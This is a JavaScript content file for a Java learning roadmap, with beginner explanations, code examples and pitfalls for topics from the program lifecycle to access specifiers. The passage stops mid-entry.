// Content for the "java" roadmap. One entry per topic id (see data/java.js).
window.CONTENT_DATA = window.CONTENT_DATA || {};
window.CONTENT_DATA["java"] = window.CONTENT_DATA["java"] || {};
var C = window.CONTENT_DATA["java"];

/* ===================== LEARN THE BASICS ===================== */

C["lifecycle-of-a-program"] = {
  summary: "<p>A Java program goes through a distinct <strong>lifecycle</strong>: you write <code>.java</code> " +
    "source, the <strong>compiler (javac)</strong> turns it into platform-independent <strong>bytecode</strong> " +
    "(<code>.class</code> files), and the <strong>JVM (Java Virtual Machine)</strong> loads, verifies, and " +
    "executes that bytecode &mdash; interpreting it and JIT-compiling hot paths to native code at runtime. " +
    "This 'write once, run anywhere' model is Java's defining trait: the same bytecode runs on any platform " +
    "with a JVM.</p>",
  examples: [
    {
      title: "Example 1: Compile then run",
      description: "<p>Source &rarr; bytecode &rarr; JVM execution.</p>",
      code: "// Hello.java  -> write source\njavac Hello.java   // compile -> Hello.class (bytecode)\njava Hello         // JVM loads + runs the bytecode\n// The same Hello.class runs unchanged on Windows, Linux, macOS."
    },
    {
      title: "Example 2: The minimal program",
      description: "<p>Execution starts at <code>main</code>.</p>",
      code: "public class Hello {\n  public static void main(String[] args) {\n    System.out.println(\"Hello, Java\");\n  }\n}\n// JVM finds main(), runs it, exits when it returns."
    },
    {
      title: "Example 3: one JAR, many platforms",
      description: "<p>Package compiled bytecode once and run it anywhere a JVM exists.</p>",
      code: "jar --create --file app.jar --main-class Hello Hello.class\n" +
        "java -jar app.jar   // same app.jar runs on any OS with a matching JVM\n" +
        "// 'write once, run anywhere' - the bytecode, not the source, is the artifact."
    },
    {
      title: "Example 4 (edge case): class version mismatch",
      description: "<p>Bytecode compiled by a newer JDK won't run on an older JVM - a very common deployment error.</p>",
      code: "// Compiled with JDK 21, run on a JVM for Java 17:\n" +
        "//   java.lang.UnsupportedClassVersionError: Hello has been compiled by a more\n" +
        "//   recent version of the Java Runtime (class file version 65.0)\n" +
        "// Fix: run on JDK 21+, or compile with --release 17 to target the older JVM."
    }
  ],
  whenToUse: "<p>Understanding the lifecycle explains Java's behavior: why there's a compile step (errors caught " +
    "early), why bytecode is portable, and why the JVM 'warms up' (JIT compiles frequently-run code for " +
    "speed). <strong>Gotchas:</strong> you need a matching JDK (to compile) and JRE/JVM (to run); version " +
    "mismatches cause 'unsupported class version' errors. Modern tools (Maven/Gradle) and IDEs automate " +
    "compile+run, but knowing the underlying steps helps you debug classpath, version, and packaging issues.</p>"
};

C["basic-syntax"] = {
  summary: "<p>Java's <strong>basic syntax</strong>: code lives inside <strong>classes</strong>, execution " +
    "starts in <code>main</code>, statements end with a semicolon, blocks use curly braces, and the language " +
    "is <strong>case-sensitive</strong> and <strong>statically typed</strong> (every variable has a declared " +
    "type). Comments use <code>//</code> or <code>/* */</code>. Conventions: classes <code>PascalCase</code>, " +
    "methods/variables <code>camelCase</code>, constants <code>UPPER_SNAKE</code>.</p>",
  examples: [
    {
      title: "Example 1: Structure, types, statements",
      description: "<p>The core building blocks in one snippet.</p>",
      code: "public class Example {\n  public static void main(String[] args) {\n    int count = 5;            // typed declaration + statement\n    String name = \"Sam\";      // semicolons end statements\n    if (count > 0) {          // braces group blocks\n      System.out.println(name);\n    }\n  }\n}"
    },
    {
      title: "Example 2: Naming conventions",
      description: "<p>Consistent casing signals intent.</p>",
      code: "class OrderService {}          // PascalCase class\nvoid calculateTotal() {}       // camelCase method\nint itemCount;                 // camelCase variable\nstatic final int MAX_SIZE = 100; // UPPER_SNAKE constant"
    },
    {
      title: "Example 3: var for local type inference (Java 10+)",
      description: "<p><code>var</code> infers the type of a local variable from its initializer - it's still static typing, just less typing.</p>",
      code: "var count = 5;                 // inferred int\n" +
        "var name = \"Sam\";              // inferred String\n" +
        "var list = new ArrayList<String>(); // inferred ArrayList<String>\n" +
        "// var only works for locals WITH an initializer - not fields or params,\n" +
        "// and 'var x;' or 'var y = null;' won't compile (nothing to infer)."
    },
    {
      title: "Example 4 (edge case): the public class name must match the file",
      description: "<p>A frequent first error - the file name and the public class must be identical, case included.</p>",
      code: "// File: Order.java\n" +
        "public class Customer {}  // ERROR: class Customer is public, should be\n" +
        "                          //        declared in a file named Customer.java\n" +
        "// Rename the file to Customer.java, or the class to Order."
    }
  ],
  whenToUse: "<p>This is the foundation for everything. <strong>Gotchas:</strong> missing semicolons and " +
    "mismatched braces are the most common beginner errors; the compiler catches them but messages can be " +
    "cryptic. Case sensitivity bites (<code>String</code> vs <code>string</code>). The public class name must " +
    "match the filename. Follow conventions consistently &mdash; the whole ecosystem assumes them.</p>"
};

C["data-types"] = {
  summary: "<p>Java has two kinds of types: <strong>primitives</strong> (<code>int</code>, <code>long</code>, " +
    "<code>double</code>, <code>float</code>, <code>boolean</code>, <code>char</code>, <code>byte</code>, " +
    "<code>short</code>) which hold raw values directly, and <strong>reference types</strong> (objects, " +
    "arrays, <code>String</code>) which hold a reference to an object on the heap. Each primitive has a " +
    "wrapper class (<code>Integer</code>, <code>Double</code>) for use where objects are required " +
    "(collections, generics).</p>",
  examples: [
    {
      title: "Example 1: Primitives vs references",
      description: "<p>Values vs references to objects.</p>",
      code: "int age = 30;              // primitive: holds the value directly\ndouble price = 19.99;\nboolean active = true;\nString name = \"Sam\";       // reference: points to a String object\nint[] nums = {1, 2, 3};    // reference: points to an array"
    },
    {
      title: "Example 2: Wrappers and autoboxing",
      description: "<p>Primitives box into objects when needed.</p>",
      code: "Integer boxed = 42;        // autoboxing: int -> Integer\nint unboxed = boxed;       // unboxing: Integer -> int\nList<Integer> list = new ArrayList<>(); // generics need objects, not int"
    },
    {
      title: "Example 3: the Integer == identity trap",
      description: "<p>Comparing boxed wrappers with <code>==</code> compares references, with a surprising cache for small values.</p>",
      code: "Integer a = 127, b = 127;\n" +
        "System.out.println(a == b);      // true  - cached (-128..127)\n" +
        "Integer c = 128, d = 128;\n" +
        "System.out.println(c == d);      // false - different objects!\n" +
        "System.out.println(c.equals(d)); // true  - always compare values with equals()"
    },
    {
      title: "Example 4 (edge case): overflow and floating-point money",
      description: "<p>Two classic numeric bugs: silent <code>int</code> overflow and binary floating-point imprecision.</p>",
      code: "int big = Integer.MAX_VALUE + 1; // wraps to -2147483648 (no error!)\n" +
        "long ok = (long) Integer.MAX_VALUE + 1; // 2147483648 - widen first\n" +
        "\n" +
        "System.out.println(0.1 + 0.2);   // 0.30000000000000004\n" +
        "new java.math.BigDecimal(\"0.1\").add(new java.math.BigDecimal(\"0.2\")); // 0.3 exact"
    }
  ],
  whenToUse: "<p>Use primitives for performance and simple values; use wrappers when you need objects " +
    "(collections, generics, nullability). <strong>Gotchas:</strong> watch numeric overflow (<code>int</code> " +
    "max ~2.1 billion &mdash; use <code>long</code> for large values), floating-point imprecision " +
    "(<code>0.1 + 0.2 != 0.3</code> &mdash; use <code>BigDecimal</code> for money), and the boxing trap: " +
    "comparing <code>Integer</code>s with <code>==</code> compares references, not values (use " +
    "<code>.equals()</code>). Unboxing a <code>null</code> wrapper throws <code>NullPointerException</code>.</p>"
};

C["variables-and-scopes"] = {
  summary: "<p>A <strong>variable</strong> is a named, typed storage location. Its <strong>scope</strong> is " +
    "the region where it's accessible: <strong>local</strong> variables live inside a method/block, " +
    "<strong>instance</strong> fields belong to each object, <strong>static</strong> fields belong to the " +
    "class (shared). Variables are visible only within their enclosing block, and local variables must be " +
    "initialized before use.</p>",
  examples: [
    {
      title: "Example 1: The three scopes",
      description: "<p>Local, instance, and static.</p>",
      code: "class Counter {\n  static int total = 0;   // class-level (shared by all instances)\n  int value = 0;          // instance-level (per object)\n  void inc() {\n    int step = 1;         // local (only inside inc())\n    value += step;\n    total += step;\n  }\n}"
    },
    {
      title: "Example 2: Block scope",
      description: "<p>A variable dies at the end of its block.</p>",
      code: "for (int i = 0; i < 3; i++) {\n  int squared = i * i;   // scoped to the loop body\n}\n// System.out.println(i);       // ERROR: i out of scope\n// System.out.println(squared);  // ERROR: out of scope"
    },
    {
      title: "Example 3: shadowing - inner scope hides outer",
      description: "<p>A local variable can shadow a field of the same name; <code>this.</code> reaches the field.</p>",
      code: "class Account {\n" +
        "  int balance = 100;\n" +
        "  void set(int balance) {        // parameter shadows the field\n" +
        "    // balance = balance;        // BUG: assigns the param to itself\n" +
        "    this.balance = balance;      // correct: field = parameter\n" +
        "  }\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): a block-scoped variable can't leak out",
      description: "<p>Variables declared inside a block (loop, if) don't exist after it - a common 'cannot find symbol' error.</p>",
      code: "for (int i = 0; i < 3; i++) { /* ... */ }\n" +
        "System.out.println(i); // ERROR: cannot find symbol 'i' (scope ended)\n" +
        "\n" +
        "int found;\n" +
        "if (cond) { found = 1; }\n" +
        "System.out.println(found); // ERROR: 'found' may not have been initialized"
    }
  ],
  whenToUse: "<p>Declare variables in the <strong>narrowest scope</strong> that works &mdash; it reduces bugs " +
    "and improves readability. <strong>Gotchas:</strong> local variables aren't auto-initialized (using one " +
    "before assignment is a compile error), but instance/static fields get defaults (0, false, null). Static " +
    "fields are shared across all instances &mdash; mutable shared state causes thread-safety issues. Prefer " +
    "<code>final</code> for variables that shouldn't change. Use <code>var</code> (Java 10+) for local " +
    "inference where the type is obvious.</p>"
};

C["type-casting"] = {
  summary: "<p><strong>Type casting</strong> converts a value from one type to another. <strong>Widening</strong> " +
    "(e.g. <code>int</code> &rarr; <code>long</code>) is automatic and safe; <strong>narrowing</strong> " +
    "(e.g. <code>double</code> &rarr; <code>int</code>) requires an explicit cast and may lose data. For " +
    "objects, <strong>upcasting</strong> to a supertype is implicit, while <strong>downcasting</strong> to a " +
    "subtype needs an explicit cast and can throw <code>ClassCastException</code> at runtime.</p>",
  examples: [
    {
      title: "Example 1: Primitive widening vs narrowing",
      description: "<p>Automatic vs explicit, with possible loss.</p>",
      code: "int i = 100;\nlong l = i;            // widening: automatic, safe\ndouble d = 9.99;\nint n = (int) d;       // narrowing: explicit cast, n = 9 (truncated!)"
    },
    {
      title: "Example 2: Object up/downcasting with instanceof",
      description: "<p>Check before downcasting to avoid exceptions.</p>",
      code: "Object o = \"hello\";\nString s = (String) o;          // downcast (works here)\n// Safe pattern (Java 16+ pattern matching):\nif (o instanceof String str) {\n  System.out.println(str.length());\n}"
    },
    {
      title: "Example 3: safe downcasting with instanceof pattern matching",
      description: "<p>Modern Java tests and casts in one step, avoiding a separate cast and a possible ClassCastException.</p>",
      code: "Object o = \"hello\";\n" +
        "if (o instanceof String s) {   // tests AND binds 's' if it matches\n" +
        "  System.out.println(s.length()); // use the narrowed variable directly\n" +
        "}\n" +
        "// Old style needed: if (o instanceof String) { String s = (String) o; ... }"
    },
    {
      title: "Example 4 (edge case): narrowing primitive casts lose data silently",
      description: "<p>Casting a wider numeric type to a narrower one truncates with no warning - a real source of bugs.</p>",
      code: "double d = 9.99;\n" +
        "int i = (int) d;        // 9  - fractional part dropped (not rounded)\n" +
        "\n" +
        "int big = 300;\n" +
        "byte b = (byte) big;    // 44 - overflow wraps around (byte max is 127)\n" +
        "\n" +
        "Object n = Integer.valueOf(1);\n" +
        "String s = (String) n;  // compiles, throws ClassCastException at runtime"
    }
  ],
  whenToUse: "<p>Cast when converting between numeric types or working with polymorphic objects. " +
    "<strong>Gotchas:</strong> narrowing silently loses data (truncation, overflow) &mdash; be intentional. " +
    "Downcasting to the wrong type throws <code>ClassCastException</code>, so guard with <code>instanceof</code> " +
    "(use pattern matching to combine check + cast). Excessive downcasting often signals a design problem &mdash; " +
    "prefer polymorphism or generics so casts aren't needed.</p>"
};

C["conditionals"] = {
  summary: "<p><strong>Conditionals</strong> control which code runs based on boolean expressions: " +
    "<code>if</code>/<code>else if</code>/<code>else</code>, the ternary operator <code>?:</code>, and " +
    "<code>switch</code> (including modern switch expressions). They direct program flow by evaluating " +
    "conditions and branching accordingly.</p>",
  examples: [
    {
      title: "Example 1: if/else and ternary",
      description: "<p>Branch on conditions; ternary for concise value selection.</p>",
      code: "int score = 85;\nString grade;\nif (score >= 90) grade = \"A\";\nelse if (score >= 80) grade = \"B\";\nelse grade = \"F\";\n\n// Ternary for a simple choice:\nString status = (score >= 60) ? \"pass\" : \"fail\";"
    },
    {
      title: "Example 2: Modern switch expression",
      description: "<p>Switch expressions (Java 14+) return a value, no fall-through.</p>",
      code: "String day = \"MON\";\nint hours = switch (day) {\n  case \"SAT\", \"SUN\" -> 0;\n  default -> 8;\n};  // arrow form: no break needed, exhaustive"
    },
    {
      title: "Example 3: switch expressions with arrow syntax (Java 14+)",
      description: "<p>The arrow form returns a value, needs no <code>break</code>, and the compiler enforces exhaustiveness.</p>",
      code: "int days = switch (month) {\n" +
        "  case \"FEB\" -> 28;\n" +
        "  case \"APR\", \"JUN\", \"SEP\", \"NOV\" -> 30;\n" +
        "  default -> 31;\n" +
        "};\n" +
        "// No fall-through, no break, and 'days' is assigned in every path."
    },
    {
      title: "Example 4 (edge case): classic switch fall-through and the dangling else",
      description: "<p>The old colon <code>switch</code> falls through without <code>break</code>; and <code>else</code> binds to the nearest <code>if</code>.</p>",
      code: "switch (n) {\n" +
        "  case 1: doA();   // no break -> ALSO runs doB()! (fall-through bug)\n" +
        "  case 2: doB(); break;\n" +
        "}\n" +
        "\n" +
        "if (a) if (b) x(); else y(); // 'else' pairs with 'if (b)', not 'if (a)'"
    }
  ],
  whenToUse: "<p>Everywhere you make decisions. <strong>Gotchas:</strong> classic <code>switch</code> with " +
    "<code>:</code> falls through if you forget <code>break</code> &mdash; the modern arrow (<code>-></code>) " +
    "syntax avoids this and can return a value. Watch <code>==</code> vs <code>.equals()</code> for objects/" +
    "Strings in conditions. Keep conditions readable &mdash; prefer guard clauses (early returns) over deep " +
    "nesting. Comparing with <code>=</code> instead of <code>==</code> is caught by the compiler (Java " +
    "requires boolean conditions).</p>"
};

C["loops"] = {
  summary: "<p><strong>Loops</strong> repeat code: <code>for</code> (counter-based), enhanced " +
    "<code>for-each</code> (iterate collections/arrays), <code>while</code> (repeat while a condition holds), " +
    "and <code>do-while</code> (run at least once). <code>break</code> exits a loop; <code>continue</code> " +
    "skips to the next iteration.</p>",
  examples: [
    {
      title: "Example 1: for vs for-each",
      description: "<p>Index-based vs element-based iteration.</p>",
      code: "int[] nums = {10, 20, 30};\nfor (int i = 0; i < nums.length; i++) {   // when you need the index\n  System.out.println(i + \": \" + nums[i]);\n}\nfor (int n : nums) {                       // when you just need values\n  System.out.println(n);\n}"
    },
    {
      title: "Example 2: while, break, continue",
      description: "<p>Condition-driven looping with control statements.</p>",
      code: "int i = 0;\nwhile (i < 10) {\n  i++;\n  if (i % 2 == 0) continue;  // skip evens\n  if (i > 7) break;          // stop early\n  System.out.println(i);     // 1, 3, 5, 7\n}"
    },
    {
      title: "Example 3: break, continue, and labeled loops",
      description: "<p>A label lets <code>break</code>/<code>continue</code> target an outer loop - the clean way out of nested iteration.</p>",
      code: "outer:\n" +
        "for (int i = 0; i < rows; i++) {\n" +
        "  for (int j = 0; j < cols; j++) {\n" +
        "    if (grid[i][j] == target) break outer; // exits BOTH loops\n" +
        "    if (grid[i][j] == 0) continue;          // skip to next j\n" +
        "  }\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): ConcurrentModificationException while iterating",
      description: "<p>Modifying a collection during a for-each throws; use the iterator's own <code>remove</code> or <code>removeIf</code>.</p>",
      code: "List<Integer> xs = new ArrayList<>(List.of(1, 2, 3));\n" +
        "for (int x : xs) { if (x == 2) xs.remove(Integer.valueOf(x)); } // throws!\n" +
        "\n" +
        "xs.removeIf(x -> x == 2);              // correct, concise\n" +
        "// or use an explicit Iterator and call it.remove()"
    }
  ],
  whenToUse: "<p>Use <code>for-each</code> when you just need elements (cleaner, less error-prone), indexed " +
    "<code>for</code> when you need the position or to modify by index, <code>while</code> for " +
    "condition-driven repetition, <code>do-while</code> when the body must run once. <strong>Gotchas:</strong> " +
    "off-by-one errors (<code>&lt;</code> vs <code>&lt;=</code>), infinite loops (forgetting to advance the " +
    "condition), and modifying a collection while iterating it (throws " +
    "<code>ConcurrentModificationException</code> &mdash; use an iterator's <code>remove()</code> or collect " +
    "changes). For data transformations, the Stream API is often clearer than explicit loops.</p>"
};

C["arrays"] = {
  summary: "<p>An <strong>array</strong> is a fixed-size, ordered collection of elements of the same type, " +
    "stored contiguously and accessed by zero-based index. Its length is fixed at creation (<code>arr.length</code>). " +
    "Arrays are the lowest-level collection; for resizable, feature-rich collections you use " +
    "<code>ArrayList</code> and friends.</p>",
  examples: [
    {
      title: "Example 1: Declaring and accessing",
      description: "<p>Create, index, and iterate an array.</p>",
      code: "int[] nums = new int[3];     // {0, 0, 0} default-initialized\nnums[0] = 10;                // index access\nint[] primes = {2, 3, 5, 7}; // literal initialization\nSystem.out.println(primes.length); // 4\nfor (int p : primes) System.out.println(p);"
    },
    {
      title: "Example 2: Multidimensional + utilities",
      description: "<p>Arrays of arrays and the Arrays helper class.</p>",
      code: "int[][] grid = {{1, 2}, {3, 4}};   // 2D array\nSystem.out.println(grid[1][0]);    // 3\nint[] a = {3, 1, 2};\njava.util.Arrays.sort(a);          // {1, 2, 3}\nSystem.out.println(java.util.Arrays.toString(a));"
    },
    {
      title: "Example 3: multidimensional and jagged arrays",
      description: "<p>Java arrays-of-arrays can have rows of different lengths (jagged).</p>",
      code: "int[][] grid = new int[2][3];     // 2 rows, 3 cols\n" +
        "grid[0][1] = 5;\n" +
        "\n" +
        "int[][] jagged = new int[2][];    // rows allocated separately\n" +
        "jagged[0] = new int[]{1, 2};\n" +
        "jagged[1] = new int[]{1, 2, 3, 4}; // different length - allowed"
    },
    {
      title: "Example 4 (edge case): fixed length and array covariance",
      description: "<p>Arrays can't grow, and their unsafe covariance lets a bad store compile but fail at runtime.</p>",
      code: "int[] a = new int[3];\n" +
        "a[3] = 1;                 // ArrayIndexOutOfBoundsException (length is 3)\n" +
        "\n" +
        "Object[] arr = new String[2]; // legal: arrays are covariant\n" +
        "arr[0] = 42;              // compiles, throws ArrayStoreException at runtime\n" +
        "// Generics (List<String>) are invariant and catch this at compile time."
    }
  ],
  whenToUse: "<p>Use arrays for fixed-size, performance-sensitive, or primitive data. <strong>Gotchas:</strong> " +
    "<code>ArrayIndexOutOfBoundsException</code> for invalid indices (0 to length-1); the size can't change " +
    "(use <code>ArrayList</code> if it must). <code>array.length</code> is a field (no parentheses), unlike " +
    "<code>String.length()</code> and <code>list.size()</code>. Arrays don't override <code>toString()</code>/" +
    "<code>equals()</code> meaningfully &mdash; use <code>Arrays.toString()</code>/<code>Arrays.equals()</code>. " +
    "For most app code, prefer collections; reach for raw arrays when you need primitives or fixed size.</p>"
};

C["strings-and-methods"] = {
  summary: "<p><strong>Strings</strong> represent text and are <strong>immutable</strong> in Java &mdash; " +
    "every 'modification' creates a new <code>String</code>. They come with a rich method set " +
    "(<code>length()</code>, <code>substring()</code>, <code>indexOf()</code>, <code>split()</code>, " +
    "<code>replace()</code>, <code>toUpperCase()</code>, etc.). For heavy concatenation, use " +
    "<code>StringBuilder</code> (mutable) to avoid creating many intermediate objects.</p>",
  examples: [
    {
      title: "Example 1: Common string methods",
      description: "<p>Strings are immutable; methods return new strings.</p>",
      code: "String s = \"Hello, World\";\ns.length();              // 12\ns.substring(7);          // \"World\"\ns.toUpperCase();         // \"HELLO, WORLD\" (new string)\ns.split(\", \");           // [\"Hello\", \"World\"]\ns.contains(\"World\");     // true"
    },
    {
      title: "Example 2: StringBuilder for concatenation",
      description: "<p>Avoid creating many strings in a loop.</p>",
      code: "// Inefficient: creates a new String each iteration\n// String r = \"\"; for (...) r += x;\nStringBuilder sb = new StringBuilder();\nfor (int i = 0; i < 1000; i++) sb.append(i).append(\",\");\nString result = sb.toString();"
    },
    {
      title: "Example 3: build strings in a loop with StringBuilder",
      description: "<p>Because String is immutable, concatenating in a loop creates many throwaway objects; StringBuilder mutates one buffer.</p>",
      code: "// O(n^2) garbage - avoid in loops:\n" +
        "String s = \"\";\n" +
        "for (String w : words) s += w + \",\";\n" +
        "\n" +
        "// Efficient:\n" +
        "StringBuilder sb = new StringBuilder();\n" +
        "for (String w : words) sb.append(w).append(',');\n" +
        "String result = sb.toString();"
    },
    {
      title: "Example 4 (edge case): == compares references, not contents",
      description: "<p>The single most common String bug - use <code>equals</code>; the string pool makes <code>==</code> deceptively work for literals.</p>",
      code: "String a = \"hi\";\n" +
        "String b = \"hi\";\n" +
        "String c = new String(\"hi\");\n" +
        "System.out.println(a == b);        // true  - both interned literals\n" +
        "System.out.println(a == c);        // false - c is a new object\n" +
        "System.out.println(a.equals(c));   // true  - compare CONTENT with equals()"
    }
  ],
  whenToUse: "<p>Use <code>String</code> for text everywhere; use <code>StringBuilder</code> when building " +
    "strings in loops. <strong>Gotchas:</strong> immutability means <code>s.toUpperCase()</code> returns a " +
    "new string &mdash; the original is unchanged (a common beginner mistake). Compare strings with " +
    "<code>.equals()</code>, never <code>==</code> (which compares references). Be aware of the string pool " +
    "(literals are interned). For text blocks (multi-line strings), use <code>\"\"\"</code> (Java 15+). For " +
    "user-facing formatting, use <code>String.format()</code> / <code>formatted()</code>.</p>"
};

C["math-operations"] = {
  summary: "<p>Java provides arithmetic operators (<code>+ - * / %</code>), compound assignments " +
    "(<code>+=</code>), increment/decrement (<code>++ --</code>), and the <strong><code>Math</code></strong> " +
    "class for advanced operations (<code>pow</code>, <code>sqrt</code>, <code>abs</code>, <code>max</code>, " +
    "<code>round</code>, <code>random</code>). Integer and floating-point division behave differently, and " +
    "for exact decimal math you use <code>BigDecimal</code>.</p>",
  examples: [
    {
      title: "Example 1: Operators and the Math class",
      description: "<p>Arithmetic plus Math utilities.</p>",
      code: "int a = 17, b = 5;\na / b;          // 3 (integer division truncates)\na % b;          // 2 (remainder)\nMath.pow(2, 10);   // 1024.0\nMath.max(a, b);    // 17\nMath.sqrt(144);    // 12.0"
    },
    {
      title: "Example 2: Integer division + BigDecimal for money",
      description: "<p>Common pitfalls and the precise alternative.</p>",
      code: "double avg = 7 / 2;      // 3.0 (int division BEFORE assignment!)\ndouble ok = 7 / 2.0;     // 3.5 (one operand is double)\n// Money: avoid float/double; use BigDecimal\nBigDecimal total = new BigDecimal(\"19.99\").multiply(new BigDecimal(\"3\"));"
    },
    {
      title: "Example 3: integer division and modulo pitfalls",
      description: "<p>Dividing two ints discards the remainder; force floating point by making one operand a double.</p>",
      code: "int avg = 7 / 2;            // 3, not 3.5 (integer division truncates)\n" +
        "double real = 7 / 2.0;      // 3.5 - one double operand promotes the whole expr\n" +
        "\n" +
        "System.out.println(-7 % 3); // -1 in Java (sign follows the dividend)\n" +
        "System.out.println(Math.floorMod(-7, 3)); // 2 - true modulo if you want it"
    },
    {
      title: "Example 4 (edge case): division by zero differs for int vs double",
      description: "<p>Integer division by zero throws; floating-point division by zero yields Infinity/NaN.</p>",
      code: "int x = 1 / 0;              // throws ArithmeticException: / by zero\n" +
        "double y = 1.0 / 0;         // Infinity (no exception)\n" +
        "double z = 0.0 / 0.0;       // NaN\n" +
        "System.out.println(z == z); // false! NaN is not equal to itself - use Double.isNaN"
    }
  ],
  whenToUse: "<p>For all numeric computation. <strong>Gotchas:</strong> integer division truncates " +
    "(<code>7/2 == 3</code>) and happens <em>before</em> assignment to a double &mdash; cast or use a double " +
    "literal. Floating-point is imprecise (<code>0.1+0.2</code>) &mdash; never use <code>double</code> for " +
    "money; use <code>BigDecimal</code> (with String constructor). Watch integer overflow (use " +
    "<code>long</code> or <code>Math.addExact</code> to detect it). <code>Math.random()</code> is fine for " +
    "casual use, but use <code>SecureRandom</code> for security-sensitive randomness.</p>"
};

/* ===================== BASICS OF OOP ===================== */

C["classes-and-objects"] = {
  summary: "<p>A <strong>class</strong> is a blueprint defining the data (fields) and behavior (methods) of a " +
    "type; an <strong>object</strong> is a concrete instance created from a class with <code>new</code>. " +
    "Classes are the fundamental unit of Java &mdash; nearly all code lives in them. A constructor " +
    "initializes new objects.</p>",
  examples: [
    {
      title: "Example 1: Defining a class and creating objects",
      description: "<p>Blueprint vs instance.</p>",
      code: "class Dog {\n  String name;                 // field\n  Dog(String name) { this.name = name; } // constructor\n  void bark() { System.out.println(name + \" says Woof\"); } // method\n}\nDog rex = new Dog(\"Rex\");        // object (instance)\nrex.bark();                      // Rex says Woof"
    },
    {
      title: "Example 2: Multiple independent instances",
      description: "<p>Each object holds its own state.</p>",
      code: "Dog a = new Dog(\"Rex\");\nDog b = new Dog(\"Mia\");\na.bark();   // Rex says Woof\nb.bark();   // Mia says Woof  (separate state)"
    },
    {
      title: "Example 3: constructors, this, and overloading",
      description: "<p>Multiple constructors can delegate to each other with <code>this(...)</code>.</p>",
      code: "class Point {\n" +
        "  int x, y;\n" +
        "  Point() { this(0, 0); }            // delegates to the 2-arg constructor\n" +
        "  Point(int x, int y) { this.x = x; this.y = y; }\n" +
        "}\n" +
        "new Point();        // (0, 0)\n" +
        "new Point(3, 4);    // (3, 4)"
    },
    {
      title: "Example 4 (edge case): object identity vs equality",
      description: "<p>Two distinct objects are never <code>==</code>; override <code>equals</code>/<code>hashCode</code> for value equality.</p>",
      code: "Point a = new Point(1, 1);\n" +
        "Point b = new Point(1, 1);\n" +
        "System.out.println(a == b);      // false - different references\n" +
        "System.out.println(a.equals(b)); // false too, unless equals() is overridden\n" +
        "// Without overriding, equals() defaults to ==. Records do it for you."
    }
  ],
  whenToUse: "<p>Classes model the entities and concepts of your domain. <strong>Gotchas:</strong> use " +
    "<code>this</code> to disambiguate fields from parameters of the same name. Each <code>new</code> creates " +
    "a separate object on the heap; variables hold references, so assigning one object variable to another " +
    "copies the reference, not the object. Keep classes focused (single responsibility), and prefer small, " +
    "cohesive classes over large 'god' classes. For pure data carriers, consider <code>record</code>.</p>"
};

C["attributes-and-methods"] = {
  summary: "<p><strong>Attributes</strong> (fields/instance variables) hold an object's state; " +
    "<strong>methods</strong> define its behavior. Methods have a signature (name + parameters), a return " +
    "type, and a body. Together, fields and methods encapsulate data with the operations that act on it &mdash; " +
    "the core idea of objects.</p>",
  examples: [
    {
      title: "Example 1: Fields and methods together",
      description: "<p>State plus the behavior that uses it.</p>",
      code: "class BankAccount {\n  private double balance;          // attribute (state)\n  void deposit(double amt) {       // method (behavior)\n    balance += amt;\n  }\n  double getBalance() { return balance; }\n}"
    },
    {
      title: "Example 2: Parameters and return values",
      description: "<p>Methods take input and produce output.</p>",
      code: "class Calculator {\n  int add(int a, int b) { return a + b; }      // returns a value\n  void log(String msg) { System.out.println(msg); } // void: no return\n}\nnew Calculator().add(2, 3);   // 5"
    },
    {
      title: "Example 3: instance vs static members",
      description: "<p>Instance fields/methods belong to each object; static ones belong to the class.</p>",
      code: "class Counter {\n" +
        "  static int total = 0;   // shared across all instances\n" +
        "  int id;                 // unique per instance\n" +
        "  Counter() { id = ++total; }\n" +
        "}\n" +
        "new Counter(); new Counter();\n" +
        "System.out.println(Counter.total); // 2 - accessed via the class"
    },
    {
      title: "Example 4 (edge case): a getter that leaks a mutable field",
      description: "<p>Returning an internal collection directly lets callers mutate your object's state behind its back.</p>",
      code: "class Team {\n" +
        "  private final List<String> members = new ArrayList<>();\n" +
        "  List<String> getMembers() { return members; }          // LEAK\n" +
        "  List<String> getMembersSafe() { return List.copyOf(members); } // defensive copy\n" +
        "}\n" +
        "team.getMembers().clear(); // wipes internal state via the leaked reference"
    }
  ],
  whenToUse: "<p>Use fields for an object's data and methods for what it can do. <strong>Gotchas:</strong> keep " +
    "fields <code>private</code> and expose behavior through methods (encapsulation) rather than exposing raw " +
    "data. Avoid anemic objects (just getters/setters with logic elsewhere) &mdash; put behavior with the data " +
    "it uses. Watch method naming (verbs for actions, <code>get/is</code> for accessors). A method doing too " +
    "much (long, many parameters) is a smell to split.</p>"
};

C["access-specifiers"] = {
  summary: "<p><strong>Access specifiers</strong> control the visibility of classes, fields, and methods: " +
    "<strong><code>private</code></strong> (same class only), <strong>default/package-private</strong> (same " +
    "package), <strong><code>protected</code></strong> (package + subclasses), and " +
    "<strong><code>public</code></strong> (everywhere). They enforce <strong>encapsulation</strong> by " +
    "hiding internals and exposing only an intended interface.</p>",
  examples: [
    {
      title: "Example 1: The four levels",
      description: "<p>From most to least restrictive.</p>",
      code: "public class User {\n  private String password;   // only this class\n  String email;              // package-private (no modifier)\n  protected int id;          // package + subclasses\n  public String name;        // everyone\n}"
    },
    {
      title: "Example 2: Encapsulation in practice",
      description: "<p>Private fields, public controlled access.</p>",
      code: "public class Account {\n  private double balance;            // hidden\n  public void deposit(double a) {    // controlled entry point\n    if (a <= 0) throw new IllegalArgumentException();\n    balance += a;\n  }\n  public double getBalance() { return balance; }\n}"
    },
    {
      title: "Example 3: the four levels at a glance",
      description: "<p>From most to least restrictive: <code>private</code> &rarr; package-private (no modifier) &rarr; <code>protected</code> &rarr; <code>public</code>.</p>",
      code: "public class Api {\n" +
        "  public int open;        // everyone\n" +
        "  protected int family;   // this package + subclasses anywhere\n" +
        "  int samePackage;        // (no modifier) this package only\n" +
        "  private int hidden;     // this class only\n" +
        "}"
    },
    {
      title: "Example 4 (edge case): you cannot weaken access when overriding",
      description: "<p>An override may widen visibility but never narrow it, or the subtype would break its parent's contract.</p>",
      code: "class Base { public void run() {} }\n" +
        "class Sub extends Base {\n" +
        "  @Override protected void run() {} // ERROR: attempting weaker access\n" +
        "}\n" +
        "// Allowed the other way: a protected method may be overridden as public."
    }
  ],
  whenToUse: "<p>Default to the <strong>most restrictive</strong> level that works &mdash; usually " +
    "<code>private</code> fields with <code>public</code> methods. <strong>Gotchas:</strong> public mutable " +
    "fields break encapsulation (anyone can corrupt state). <code>protected</code> exposes members to " +
    "subclasses <em>and</em> the whole package, which is broader than people expect. The module system (Java " +
    "9+) adds another visibility layer (exported packages). Widening access later is easy; narrowing it after " +
